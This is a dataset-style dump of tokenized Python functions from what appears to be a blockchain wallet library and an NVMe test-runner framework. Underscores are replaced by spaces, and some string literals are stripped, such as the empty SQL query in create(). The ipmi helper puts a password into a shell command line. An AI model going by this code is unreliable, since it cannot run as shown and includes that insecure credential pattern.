def unlocked ( self ) : if self . password is not None : return bool ( self . password ) else : if ( "UNLOCK" in os . environ and os . environ [ "UNLOCK" ] and self . config key in self . config and self . config [ self . config key ] ) : log . debug ( "Trying to use environmental " "variable to unlock wallet" ) self . unlock ( os . environ . get ( "UNLOCK" ) ) return bool ( self . password ) return False
def decrypt masterpassword ( self ) : aes = AES Cipher ( self . password ) checksum , encrypted master = self . config [ self . config key ] . split ( "$" ) try : decrypted master = aes . decrypt ( encrypted master ) except Exception : self . raise wrongmasterpassexception ( ) if checksum != self . derive checksum ( decrypted master ) : self . raise wrongmasterpassexception ( ) self . decrypted master = decrypted master
def change password ( self , newpassword ) : if not self . unlocked ( ) : raise Wallet Locked self . password = newpassword self . save encrypted masterpassword ( )
def derive y from x ( self , x , is even ) : curve = ecdsa . SECP256k1 . curve # The curve equation over F p is: #   y^2 = x^3 + ax + b a , b , p = curve . a ( ) , curve . b ( ) , curve . p ( ) alpha = ( pow ( x , 3 , p ) + a * x + b ) % p beta = ecdsa . numbertheory . square root mod prime ( alpha , p ) if ( beta % 2 ) == is even : beta = p - beta return beta
def point ( self ) : string = unhexlify ( self . un Compressed ( ) ) return ecdsa . Verifying Key . from string ( string [ 1 : ] , curve = ecdsa . SECP256k1 ) . pubkey . point
def child ( self , offset256 ) : a = bytes ( self ) + offset256 s = hashlib . sha256 ( a ) . digest ( ) return self . add ( s )
def from privkey ( cls , privkey , prefix = None ) : privkey = Private Key ( privkey , prefix = prefix or Prefix . prefix ) secret = unhexlify ( repr ( privkey ) ) order = ecdsa . Signing Key . from string ( secret , curve = ecdsa . SECP256k1 ) . curve . generator . order ( ) p = ecdsa . Signing Key . from string ( secret , curve = ecdsa . SECP256k1 ) . verifying key . pubkey . point x str = ecdsa . util . number to string ( p . x ( ) , order ) # y str = ecdsa.util.number to string(p.y(), order) compressed = hexlify ( chr ( 2 + ( p . y ( ) & 1 ) ) . encode ( "ascii" ) + x str ) . decode ( "ascii" ) # uncompressed = hexlify( #    chr(4).encode('ascii') + x str + y str).decode('ascii') return cls ( compressed , prefix = prefix or Prefix . prefix )
def child ( self , offset256 ) : a = bytes ( self . pubkey ) + offset256 s = hashlib . sha256 ( a ) . digest ( ) return self . derive from seed ( s )
def get Operation Name For Id ( self , i ) : for key in self . ops : if int ( self . ops [ key ] ) is int ( i ) : return key raise Value Error ( "Unknown Operation ID %d" % i )
def find next ( self ) : if int ( self . num retries ) < 0 : # pragma: no cover self . cnt retries += 1 sleeptime = ( self . cnt retries - 1 ) * 2 if self . cnt retries < 10 else 10 if sleeptime : log . warning ( "Lost connection to node during rpcexec(): %s (%d/%d) " % ( self . url , self . cnt retries , self . num retries ) + "Retrying in %d seconds" % sleeptime ) sleep ( sleeptime ) return next ( self . urls ) urls = [ k for k , v in self . url counter . items ( ) if ( # Only provide URLS if num retries is bigger equal 0, # i.e. we want to do reconnects at all int ( self . num retries ) >= 0 # the counter for this host/endpoint should be smaller than # num retries and v <= self . num retries # let's not retry with the same URL *if* we have others # available and ( k != self . url or len ( self . url counter ) == 1 ) ) ] if not len ( urls ) : raise Num Retries Reached url = urls [ 0 ] return url
def reset counter ( self ) : self . cnt retries = 0 for i in self . url counter : self . url counter [ i ] = 0
def have Key ( self , key ) : query = ( "SELECT {} FROM {} WHERE {}=?" . format ( self . value , self . tablename , self . key ) , ( key , ) , ) connection = sqlite3 . connect ( self . sqlite file ) cursor = connection . cursor ( ) cursor . execute ( * query ) return True if cursor . fetchone ( ) else False
def items ( self ) : query = "SELECT {}, {} from {}" . format ( self . key , self . value , self . tablename ) connection = sqlite3 . connect ( self . sqlite file ) cursor = connection . cursor ( ) cursor . execute ( query ) r = [ ] for key , value in cursor . fetchall ( ) : r . append ( ( key , value ) ) return r
def exists ( self ) : query = ( "SELECT name FROM sqlite master " + "WHERE type='table' AND name=?" , ( self . tablename , ) , ) connection = sqlite3 . connect ( self . sqlite file ) cursor = connection . cursor ( ) cursor . execute ( * query ) return True if cursor . fetchone ( ) else False
def create ( self ) : # pragma: no cover query = ( ) . format ( self . tablename , self . key , self . value ) connection = sqlite3 . connect ( self . sqlite file ) cursor = connection . cursor ( ) cursor . execute ( query ) connection . commit ( )
def get raw ( self ) : if not self . ops : return ops = [ self . operations . Op wrapper ( op = o ) for o in list ( self . ops ) ] proposer = self . account class ( self . proposer , blockchain instance = self . blockchain ) data = { "fee" : { "amount" : 0 , "asset id" : "1.3.0" } , "fee paying account" : proposer [ "id" ] , "expiration time" : format Time From Now ( self . proposal expiration ) , "proposed ops" : [ o . json ( ) for o in ops ] , "extensions" : [ ] , } if self . proposal review : data . update ( { "review period seconds" : self . proposal review } ) ops = self . operations . Proposal create ( * * data ) return self . operation class ( ops )
def json ( self ) : if not self . is constructed ( ) or self . is require reconstruction ( ) : self . construct Tx ( ) return dict ( self )
def append Wif ( self , wif ) : if wif : try : self . privatekey class ( wif ) self . wifs . add ( wif ) except Exception : raise Invalid Wif Error
def set fee asset ( self , fee asset ) : if isinstance ( fee asset , self . amount class ) : self . fee asset id = fee asset [ "id" ] elif isinstance ( fee asset , self . asset class ) : self . fee asset id = fee asset [ "id" ] elif fee asset : self . fee asset id = fee asset else : self . fee asset id = "1.3.0"
def verify authority ( self ) : try : if not self . blockchain . rpc . verify authority ( self . json ( ) ) : raise Insufficient Authority Error except Exception as e : raise e
def clear ( self ) : self . ops = [ ] self . wifs = set ( ) self . signing accounts = [ ] # This makes sure that  is constructed will return False afterwards self [ "expiration" ] = None dict . init ( self , { } )
def id ( self ) : # Store signatures temporarily since they are not part of # transaction id sigs = self . data [ "signatures" ] self . data . pop ( "signatures" , None ) # Generage Hash of the seriliazed version h = hashlib . sha256 ( bytes ( self ) ) . digest ( ) # recover signatures self . data [ "signatures" ] = sigs # Return properly truncated tx hash return hexlify ( h [ : 20 ] ) . decode ( "ascii" )
def unlock ( self , pwd ) : if self . store . is encrypted ( ) : return self . store . unlock ( pwd )
def new Wallet ( self , pwd ) : if self . created ( ) : raise Wallet Exists ( "You already have created a wallet!" ) self . store . unlock ( pwd )
def add Private Key ( self , wif ) : try : pub = self . publickey from wif ( wif ) except Exception : raise Invalid Wif Error ( "Invalid Key format!" ) if str ( pub ) in self . store : raise Key Already In Store Exception ( "Key already in the store" ) self . store . add ( str ( wif ) , str ( pub ) )
def remove Account ( self , account ) : accounts = self . get Accounts ( ) for a in accounts : if a [ "name" ] == account : self . store . delete ( a [ "pubkey" ] )
def get Owner Key For Account ( self , name ) : account = self . rpc . get account ( name ) for authority in account [ "owner" ] [ "key auths" ] : key = self . get Private Key For Public Key ( authority [ 0 ] ) if key : return key raise Key Not Found
def get Memo Key For Account ( self , name ) : account = self . rpc . get account ( name ) key = self . get Private Key For Public Key ( account [ "options" ] [ "memo key" ] ) if key : return key return False
def get Active Key For Account ( self , name ) : account = self . rpc . get account ( name ) for authority in account [ "active" ] [ "key auths" ] : try : return self . get Private Key For Public Key ( authority [ 0 ] ) except Exception : pass return False
def get Account From Private Key ( self , wif ) : pub = self . publickey from wif ( wif ) return self . get Account From Public Key ( pub )
def get Accounts From Public Key ( self , pub ) : names = self . rpc . get key references ( [ str ( pub ) ] ) [ 0 ] for name in names : yield name
def get Account From Public Key ( self , pub ) : # FIXME, this only returns the first associated key. # If the key is used by multiple accounts, this # will surely lead to undesired behavior names = list ( self . get Accounts From Public Key ( str ( pub ) ) ) if names : return names [ 0 ]
def get Accounts ( self ) : pubkeys = self . get Public Keys ( ) accounts = [ ] for pubkey in pubkeys : # Filter those keys not for our network if pubkey [ : len ( self . prefix ) ] == self . prefix : accounts . extend ( self . get Accounts From Public Key ( pubkey ) ) return accounts
def unlock wallet ( self , * args , * * kwargs ) : self . blockchain . wallet . unlock ( * args , * * kwargs ) return self
def cmd ( command ) : env ( ) ipmi = cij . env to dict ( PREFIX , EXPORTED + REQUIRED ) command = "ipmitool -U %s -P %s -H %s -p %s %s" % ( ipmi [ "USER" ] , ipmi [ "PASS" ] , ipmi [ "HOST" ] , ipmi [ "PORT" ] , command ) cij . info ( "ipmi.command: %s" % command ) return cij . util . execute ( command , shell = True , echo = True )
def regex find ( pattern , content ) : find = re . findall ( pattern , content ) if not find : cij . err ( "pattern <%r> is invalid, no matches!" % pattern ) cij . err ( "content: %r" % content ) return '' if len ( find ) >= 2 : cij . err ( "pattern <%r> is too simple, matched more than 2!" % pattern ) cij . err ( "content: %r" % content ) return '' return find [ 0 ]
def env ( ) : if cij . ssh . env ( ) : cij . err ( "board.env: invalid SSH environment" ) return 1 board = cij . env to dict ( PREFIX , REQUIRED ) # Verify REQUIRED variables if board is None : cij . err ( "board.env: invalid BOARD environment" ) return 1 board [ "CLASS" ] = " " . join ( [ board [ r ] for r in REQUIRED [ : - 1 ] ] ) board [ "IDENT" ] = "-" . join ( [ board [ "CLASS" ] , board [ "ALIAS" ] ] ) cij . env export ( PREFIX , EXPORTED , board ) # Export EXPORTED variables return 0
def cat file ( path ) : cmd = [ "cat" , path ] status , stdout , = cij . ssh . command ( cmd , shell = True , echo = True ) if status : raise Runtime Error ( "cij.nvme.env: cat %s failed" % path ) return stdout . strip ( )
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.nvme.env: invalid SSH environment" ) return 1 nvme = cij . env to dict ( PREFIX , REQUIRED ) nvme [ "DEV PATH" ] = os . path . join ( "/dev" , nvme [ "DEV NAME" ] ) # get version, chunks, luns and chs try : sysfs = os . path . join ( "/sys/class/block" , nvme [ "DEV NAME" ] , "lightnvm" ) nvme [ "LNVM VERSION" ] = cat file ( os . path . join ( sysfs , "version" ) ) if nvme [ "LNVM VERSION" ] == "2.0" : luns = "punits" chs = "groups" elif nvme [ "LNVM VERSION" ] == "1.2" : luns = "num luns" chs = "num channels" else : raise Runtime Error ( "cij.nvme.env: invalid lnvm version: %s" % nvme [ "LNVM VERSION" ] ) nvme [ "LNVM NUM CHUNKS" ] = cat file ( os . path . join ( sysfs , "chunks" ) ) nvme [ "LNVM NUM LUNS" ] = cat file ( os . path . join ( sysfs , luns ) ) nvme [ "LNVM NUM CHS" ] = cat file ( os . path . join ( sysfs , chs ) ) nvme [ "LNVM TOTAL LUNS" ] = str ( int ( nvme [ "LNVM NUM LUNS" ] ) * int ( nvme [ "LNVM NUM CHS" ] ) ) nvme [ "LNVM TOTAL CHUNKS" ] = str ( int ( nvme [ "LNVM TOTAL LUNS" ] ) * int ( nvme [ "LNVM NUM CHUNKS" ] ) ) # get spec version by identify namespace data struct if nvme [ "LNVM VERSION" ] == "2.0" : cmd = [ "nvme" , "id-ctrl" , nvme [ "DEV PATH" ] , "--raw-binary" ] status , stdout , = cij . ssh . command ( cmd , shell = True ) if status : raise Runtime Error ( "cij.nvme.env: nvme id-ctrl fail" ) buff = cij . bin . Buffer ( types = Identify CDS , length = 1 ) buff . memcopy ( stdout ) if buff [ 0 ] . VS [ 1023 ] == 0x5a : nvme [ "SPEC VERSION" ] = "Denali" else : nvme [ "SPEC VERSION" ] = "Spec20" else : nvme [ "SPEC VERSION" ] = "Spec12" # get chunk meta information nvme [ "LNVM CHUNK META LENGTH" ] = str ( get sizeof descriptor table ( nvme [ "SPEC VERSION" ] ) ) nvme [ "LNVM CHUNK META SIZE" ] = str ( int ( nvme [ "LNVM CHUNK META LENGTH" ] ) * int ( nvme [ "LNVM TOTAL CHUNKS" ] ) ) except Standard Error : traceback . print exc ( ) return 1 cij . env export ( PREFIX , EXPORTED , nvme ) return 0
def fmt ( lbaf = 3 ) : if env ( ) : cij . err ( "cij.nvme.exists: Invalid NV Me ENV." ) return 1 nvme = cij . env to dict ( PREFIX , EXPORTED + REQUIRED ) cmd = [ "nvme" , "format" , nvme [ "DEV PATH" ] , "-l" , str ( lbaf ) ] rcode , , = cij . ssh . command ( cmd , shell = True ) return rcode
def get meta ( offset , length , output ) : if env ( ) : cij . err ( "cij.nvme.meta: Invalid NV Me ENV." ) return 1 nvme = cij . env to dict ( PREFIX , EXPORTED + REQUIRED ) max size = 0x40000 with open ( output , "wb" ) as fout : for off in range ( offset , length , max size ) : size = min ( length - off , max size ) cmd = [ "nvme get-log" , nvme [ "DEV PATH" ] , "-i 0xca" , "-o 0x%x" % off , "-l 0x%x" % size , "-b" ] status , stdout , = cij . ssh . command ( cmd , shell = True ) if status : cij . err ( "cij.nvme.meta: Error get chunk meta" ) return 1 fout . write ( stdout ) return 0
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.lnvm.env: invalid SSH environment" ) return 1 lnvm = cij . env to dict ( PREFIX , REQUIRED ) nvme = cij . env to dict ( "NVME" , [ "DEV NAME" ] ) if "BGN" not in lnvm . keys ( ) : cij . err ( "cij.lnvm.env: invalid LNVM BGN" ) return 1 if "END" not in lnvm . keys ( ) : cij . err ( "cij.lnvm.env: invalid LNVM END" ) return 1 if "DEV TYPE" not in lnvm . keys ( ) : cij . err ( "cij.lnvm.env: invalid LNVM DEV TYPE" ) return 1 lnvm [ "DEV NAME" ] = "%sb%03de%03d" % ( nvme [ "DEV NAME" ] , int ( lnvm [ "BGN" ] ) , int ( lnvm [ "END" ] ) ) lnvm [ "DEV PATH" ] = "/dev/%s" % lnvm [ "DEV NAME" ] cij . env export ( PREFIX , EXPORTED , lnvm ) return 0
def compare ( buf a , buf b , ignore ) : for field in getattr ( buf a , ' fields ' ) : name , types = field [ 0 ] , field [ 1 ] if name in ignore : continue val a = getattr ( buf a , name ) val b = getattr ( buf b , name ) if isinstance ( types , ( type ( Union ) , type ( Structure ) ) ) : if compare ( val a , val b , ignore ) : return 1 elif isinstance ( types , type ( Array ) ) : for i , in enumerate ( val a ) : if isinstance ( types , ( type ( Union ) , type ( Structure ) ) ) : if compare ( val a [ i ] , val b [ i ] , ignore ) : return 1 else : if val a [ i ] != val b [ i ] : return 1 else : if val a != val b : return 1 return 0
def memcopy ( self , stream , offset = 0 , length = float ( "inf" ) ) : data = [ ord ( i ) for i in list ( stream ) ] size = min ( length , len ( data ) , self . m size ) buff = cast ( self . m buf , POINTER ( c uint8 ) ) for i in range ( size ) : buff [ offset + i ] = data [ i ]
def write ( self , path ) : with open ( path , "wb" ) as fout : fout . write ( self . m buf )
def read ( self , path ) : with open ( path , "rb" ) as fout : memmove ( self . m buf , fout . read ( self . m size ) , self . m size )
def is bad chunk ( self , chk , yml ) : cs = self . get chunk status ( chk , yml ) if cs >= 8 : return True return False
def is free chunk ( self , chk ) : cs = self . get chunk status ( chk ) if cs & 0x1 != 0 : return True return False
def is closed chunk ( self , chk ) : cs = self . get chunk status ( chk ) if cs & 0x2 != 0 : return True return False
def is open chunk ( self , chk ) : cs = self . get chunk status ( chk ) if cs & 0x4 != 0 : return True return False
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.block.env: invalid SSH environment" ) return 1 block = cij . env to dict ( PREFIX , REQUIRED ) block [ "DEV PATH" ] = "/dev/%s" % block [ "DEV NAME" ] cij . env export ( PREFIX , EXPORTED , block ) return 0
def script run ( trun , script ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:script:run { script: %s }" % script ) cij . emph ( "rnr:script:run:evars: %s" % script [ "evars" ] ) launchers = { ".py" : "python" , ".sh" : "source" } ext = os . path . splitext ( script [ "fpath" ] ) [ - 1 ] if not ext in launchers . keys ( ) : cij . err ( "rnr:script:run { invalid script[\"fpath\"]: %r }" % script [ "fpath" ] ) return 1 launch = launchers [ ext ] with open ( script [ "log fpath" ] , "a" ) as log fd : log fd . write ( "# script fpath: %r\n" % script [ "fpath" ] ) log fd . flush ( ) bgn = time . time ( ) cmd = [ 'bash' , '-c' , 'CIJ ROOT=$(cij root) && ' 'source $CIJ ROOT/modules/cijoe.sh && ' 'source %s && ' 'CIJ TEST RES ROOT="%s" %s %s ' % ( trun [ "conf" ] [ "ENV FPATH" ] , script [ "res root" ] , launch , script [ "fpath" ] ) ] if trun [ "conf" ] [ "VERBOSE" ] > 1 : cij . emph ( "rnr:script:run { cmd: %r }" % " " . join ( cmd ) ) evars = os . environ . copy ( ) evars . update ( { k : str ( script [ "evars" ] [ k ] ) for k in script [ "evars" ] } ) process = Popen ( cmd , stdout = log fd , stderr = STDOUT , cwd = script [ "res root" ] , env = evars ) process . wait ( ) script [ "rcode" ] = process . returncode script [ "wallc" ] = time . time ( ) - bgn if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:script:run { wallc: %02f }" % script [ "wallc" ] ) cij . emph ( "rnr:script:run { rcode: %r } " % script [ "rcode" ] , script [ "rcode" ] ) return script [ "rcode" ]
def trun to file ( trun , fpath = None ) : if fpath is None : fpath = yml fpath ( trun [ "conf" ] [ "OUTPUT" ] ) with open ( fpath , 'w' ) as yml file : data = yaml . dump ( trun , explicit start = True , default flow style = False ) yml file . write ( data )
def trun emph ( trun ) : if trun [ "conf" ] [ "VERBOSE" ] > 1 : # Print environment variables cij . emph ( "rnr:CONF {" ) for cvar in sorted ( trun [ "conf" ] . keys ( ) ) : cij . emph ( "  % 16s: %r" % ( cvar , trun [ "conf" ] [ cvar ] ) ) cij . emph ( "}" ) if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:INFO {" ) cij . emph ( "  OUTPUT: %r" % trun [ "conf" ] [ "OUTPUT" ] ) cij . emph ( "  yml fpath: %r" % yml fpath ( trun [ "conf" ] [ "OUTPUT" ] ) ) cij . emph ( "}" )
def tcase setup ( trun , parent , tcase fname ) : #pylint: disable=locally-disabled, unused-argument case = copy . deepcopy ( TESTCASE ) case [ "fname" ] = tcase fname case [ "fpath orig" ] = os . sep . join ( [ trun [ "conf" ] [ "TESTCASES" ] , case [ "fname" ] ] ) if not os . path . exists ( case [ "fpath orig" ] ) : cij . err ( 'rnr:tcase setup: !case["fpath orig"]: %r' % case [ "fpath orig" ] ) return None case [ "name" ] = os . path . splitext ( case [ "fname" ] ) [ 0 ] case [ "ident" ] = "/" . join ( [ parent [ "ident" ] , case [ "fname" ] ] ) case [ "res root" ] = os . sep . join ( [ parent [ "res root" ] , case [ "fname" ] ] ) case [ "aux root" ] = os . sep . join ( [ case [ "res root" ] , " aux" ] ) case [ "log fpath" ] = os . sep . join ( [ case [ "res root" ] , "run.log" ] ) case [ "fpath" ] = os . sep . join ( [ case [ "res root" ] , case [ "fname" ] ] ) case [ "evars" ] . update ( copy . deepcopy ( parent [ "evars" ] ) ) # Initalize os . makedirs ( case [ "res root" ] ) # Create DIRS os . makedirs ( case [ "aux root" ] ) shutil . copyfile ( case [ "fpath orig" ] , case [ "fpath" ] ) # Copy testcase # Initialize hooks case [ "hooks" ] = hooks setup ( trun , case , parent . get ( "hooks pr tcase" ) ) return case
def tsuite exit ( trun , tsuite ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:exit" ) rcode = 0 for hook in reversed ( tsuite [ "hooks" ] [ "exit" ] ) : # EXIT-hooks rcode = script run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:exit { rcode: %r } " % rcode , rcode ) return rcode
def tsuite enter ( trun , tsuite ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:enter { name: %r }" % tsuite [ "name" ] ) rcode = 0 for hook in tsuite [ "hooks" ] [ "enter" ] : # ENTER-hooks rcode = script run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:enter { rcode: %r } " % rcode , rcode ) return rcode
def trun exit ( trun ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun:exit" ) rcode = 0 for hook in reversed ( trun [ "hooks" ] [ "exit" ] ) : # EXIT-hooks rcode = script run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun::exit { rcode: %r }" % rcode , rcode ) return rcode
def trun enter ( trun ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun::enter" ) trun [ "stamp" ] [ "begin" ] = int ( time . time ( ) ) # Record start timestamp rcode = 0 for hook in trun [ "hooks" ] [ "enter" ] : # ENTER-hooks rcode = script run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun::enter { rcode: %r }" % rcode , rcode ) return rcode
def main ( conf ) : fpath = yml fpath ( conf [ "OUTPUT" ] ) if os . path . exists ( fpath ) : # YAML exists, we exit, it might be RUNNING! cij . err ( "main:FAILED { fpath: %r }, exists" % fpath ) return 1 trun = trun setup ( conf ) # Construct 'trun' from 'conf' if not trun : return 1 trun to file ( trun ) # Persist trun trun emph ( trun ) # Print trun before run tr err = 0 tr ent err = trun enter ( trun ) for tsuite in ( ts for ts in trun [ "testsuites" ] if not tr ent err ) : ts err = 0 ts ent err = tsuite enter ( trun , tsuite ) for tcase in ( tc for tc in tsuite [ "testcases" ] if not ts ent err ) : tc err = tcase enter ( trun , tsuite , tcase ) if not tc err : tc err += script run ( trun , tcase ) tc err += tcase exit ( trun , tsuite , tcase ) tcase [ "status" ] = "FAIL" if tc err else "PASS" trun [ "progress" ] [ tcase [ "status" ] ] += 1 # Update progress trun [ "progress" ] [ "UNKN" ] -= 1 ts err += tc err # Accumulate errors trun to file ( trun ) # Persist trun if not ts ent err : ts err += tsuite exit ( trun , tsuite ) ts err += ts ent err # Accumulate errors tr err += ts err tsuite [ "status" ] = "FAIL" if ts err else "PASS" cij . emph ( "rnr:tsuite %r" % tsuite [ "status" ] , tsuite [ "status" ] != "PASS" ) if not tr ent err : trun exit ( trun ) tr err += tr ent err trun [ "status" ] = "FAIL" if tr err else "PASS" trun [ "stamp" ] [ "end" ] = int ( time . time ( ) ) + 1 # END STAMP trun to file ( trun ) # PERSIST cij . emph ( "rnr:main:progress %r" % trun [ "progress" ] ) cij . emph ( "rnr:main:trun %r" % trun [ "status" ] , trun [ "status" ] != "PASS" ) return trun [ "progress" ] [ "UNKN" ] + trun [ "progress" ] [ "FAIL" ]
def get chunk meta ( self , meta file ) : chunks = self . envs [ "CHUNKS" ] if cij . nvme . get meta ( 0 , chunks * self . envs [ "CHUNK META SIZEOF" ] , meta file ) : raise Runtime Error ( "cij.liblight.get chunk meta: fail" ) chunk meta = cij . bin . Buffer ( types = self . envs [ "CHUNK META STRUCT" ] , length = chunks ) chunk meta . read ( meta file ) return chunk meta
def get chunk meta item ( self , chunk meta , grp , pug , chk ) : num chk = self . envs [ "NUM CHK" ] num pu = self . envs [ "NUM PU" ] index = grp * num pu * num chk + pug * num chk + chk return chunk meta [ index ]
def is bad chunk ( self , chunk meta , grp , pug , chk ) : meta = self . get chunk meta item ( chunk meta , grp , pug , chk ) if meta . CS & 0x8 != 0 : return True return False
def s20 to gen ( self , pugrp , punit , chunk , sectr ) : cmd = [ "nvm addr s20 to gen" , self . envs [ "DEV PATH" ] , "%d %d %d %d" % ( pugrp , punit , chunk , sectr ) ] status , stdout , = cij . ssh . command ( cmd , shell = True ) if status : raise Runtime Error ( "cij.liblight.s20 to gen: cmd fail" ) return int ( re . findall ( r"val: ([0-9a-fx]+)" , stdout ) [ 0 ] , 16 )
def gen to dev ( self , address ) : cmd = [ "nvm addr gen2dev" , self . envs [ "DEV PATH" ] , "0x{:x}" . format ( address ) ] status , stdout , = cij . ssh . command ( cmd , shell = True ) if status : raise Runtime Error ( "cij.liblight.gen to dev: cmd fail" ) return int ( re . findall ( r"dev: ([0-9a-fx]+)" , stdout ) [ 0 ] , 16 )
def start ( self ) : self . thread = Thread ( target = self . run , args = ( True , False ) ) self . thread . set Daemon ( True ) self . thread . start ( )
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.pci.env: invalid SSH environment" ) return 1 pci = cij . env to dict ( PREFIX , REQUIRED ) pci [ "BUS PATH" ] = "/sys/bus/pci" pci [ "DEV PATH" ] = os . sep . join ( [ pci [ "BUS PATH" ] , "devices" , pci [ "DEV NAME" ] ] ) cij . env export ( PREFIX , EXPORTED , pci ) return 0
def info ( txt ) : print ( "%s# %s%s%s" % ( PR EMPH CC , get time stamp ( ) , txt , PR NC ) ) sys . stdout . flush ( )
def good ( txt ) : print ( "%s# %s%s%s" % ( PR GOOD CC , get time stamp ( ) , txt , PR NC ) ) sys . stdout . flush ( )
def warn ( txt ) : print ( "%s# %s%s%s" % ( PR WARN CC , get time stamp ( ) , txt , PR NC ) ) sys . stdout . flush ( )
def err ( txt ) : print ( "%s# %s%s%s" % ( PR ERR CC , get time stamp ( ) , txt , PR NC ) ) sys . stdout . flush ( )
def emph ( txt , rval = None ) : if rval is None : # rval is not specified, use 'neutral' info ( txt ) elif rval == 0 : # rval is 0, by convention, this is 'good' good ( txt ) else : # any other value, considered 'bad' err ( txt )
def paths from env ( prefix = None , names = None ) : def expand path ( path ) : """Expands variables in 'path' and turns it into absolute path""" return os . path . abspath ( os . path . expanduser ( os . path . expandvars ( path ) ) ) if prefix is None : prefix = "CIJ" if names is None : names = [ "ROOT" , "ENVS" , "TESTPLANS" , "TESTCASES" , "TESTSUITES" , "MODULES" , "HOOKS" , "TEMPLATES" ] conf = { v : os . environ . get ( " " . join ( [ prefix , v ] ) ) for v in names } for env in ( e for e in conf . keys ( ) if e [ : len ( prefix ) ] in names and conf [ e ] ) : conf [ env ] = expand path ( conf [ env ] ) if not os . path . exists ( conf [ env ] ) : err ( "%s %s: %r, does not exist" % ( prefix , env , conf [ env ] ) ) return conf
def env export ( prefix , exported , env ) : for exp in exported : ENV [ " " . join ( [ prefix , exp ] ) ] = env [ exp ]
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.nvm.env: invalid SSH environment" ) return 1 nvm = cij . env to dict ( PREFIX , REQUIRED ) if "nvme" in nvm [ "DEV NAME" ] : nvm [ "DEV PATH" ] = "/dev/%s" % nvm [ "DEV NAME" ] else : nvm [ "DEV PATH" ] = "traddr:%s" % nvm [ "DEV NAME" ] cij . env export ( PREFIX , EXPORTED , nvm ) return 0
def exists ( ) : if env ( ) : cij . err ( "cij.nvm.exists: Invalid NV Me ENV." ) return 1 nvm = cij . env to dict ( PREFIX , EXPORTED + REQUIRED ) cmd = [ '[[ -b "%s" ]]' % nvm [ "DEV PATH" ] ] rcode , , = cij . ssh . command ( cmd , shell = True , echo = False ) return rcode
def pkill ( ) : if env ( ) : return 1 cmd = [ "ps -aux | grep fio | grep -v grep" ] status , , = cij . ssh . command ( cmd , shell = True , echo = False ) if not status : status , , = cij . ssh . command ( [ "pkill -f fio" ] , shell = True ) if status : return 1 return 0
def parse parms ( self ) : args = list ( ) for key , val in self . parm . items ( ) : key = key . replace ( "FIO " , "" ) . lower ( ) if key == "runtime" : args . append ( "--time based" ) if val is None : args . append ( "--%s" % key ) else : args . append ( "--%s=%s" % ( key , val ) ) return args
def import parms ( self , args ) : for key , val in args . items ( ) : self . set parm ( key , val )
def get parm ( self , key ) : if key in self . parm . keys ( ) : return self . parm [ key ] return None
def start ( self ) : self . thread = Threads ( target = self . run , args = ( True , True , False ) ) self . thread . set Daemon ( True ) self . thread . start ( )
def extract hook names ( ent ) : hnames = [ ] for hook in ent [ "hooks" ] [ "enter" ] + ent [ "hooks" ] [ "exit" ] : hname = os . path . basename ( hook [ "fpath orig" ] ) hname = os . path . splitext ( hname ) [ 0 ] hname = hname . strip ( ) hname = hname . replace ( " enter" , "" ) hname = hname . replace ( " exit" , "" ) if hname in hnames : continue hnames . append ( hname ) hnames . sort ( ) return hnames
def tcase parse descr ( tcase ) : descr short = "SHORT" descr long = "LONG" try : comment = tcase comment ( tcase ) except ( IO Error , OS Error , Value Error ) as exc : comment = [ ] cij . err ( "tcase parse descr: failed: %r, tcase: %r" % ( exc , tcase ) ) comment = [ l for l in comment if l . strip ( ) ] # Remove empty lines for line number , line in enumerate ( comment ) : if line . startswith ( "#" ) : comment [ line number ] = line [ 1 : ] if comment : descr short = comment [ 0 ] if len ( comment ) > 1 : descr long = "\n" . join ( comment [ 1 : ] ) return descr short , descr long
def process tsuite ( tsuite ) : # scoop of output from all run-logs tsuite [ "log content" ] = runlogs to html ( tsuite [ "res root" ] ) tsuite [ "aux list" ] = aux listing ( tsuite [ "aux root" ] ) tsuite [ "hnames" ] = extract hook names ( tsuite ) return True
def process tcase ( tcase ) : tcase [ "src content" ] = src to html ( tcase [ "fpath" ] ) tcase [ "log content" ] = runlogs to html ( tcase [ "res root" ] ) tcase [ "aux list" ] = aux listing ( tcase [ "aux root" ] ) tcase [ "descr short" ] , tcase [ "descr long" ] = tcase parse descr ( tcase ) tcase [ "hnames" ] = extract hook names ( tcase ) return True
def process trun ( trun ) : trun [ "log content" ] = runlogs to html ( trun [ "res root" ] ) trun [ "aux list" ] = aux listing ( trun [ "aux root" ] ) trun [ "hnames" ] = extract hook names ( trun ) return True
def postprocess ( trun ) : plog = [ ] plog . append ( ( "trun" , process trun ( trun ) ) ) for tsuite in trun [ "testsuites" ] : plog . append ( ( "tsuite" , process tsuite ( tsuite ) ) ) for tcase in tsuite [ "testcases" ] : plog . append ( ( "tcase" , process tcase ( tcase ) ) ) for task , success in plog : if not success : cij . err ( "rprtr::postprocess: FAILED for %r" % task ) return sum ( ( success for task , success in plog ) )
def rehome ( old , new , struct ) : if old == new : return if isinstance ( struct , list ) : for item in struct : rehome ( old , new , item ) elif isinstance ( struct , dict ) : for key , val in struct . iteritems ( ) : if isinstance ( val , ( dict , list ) ) : rehome ( old , new , val ) elif "conf" in key : continue elif "orig" in key : continue elif "root" in key or "path" in key : struct [ key ] = struct [ key ] . replace ( old , new )
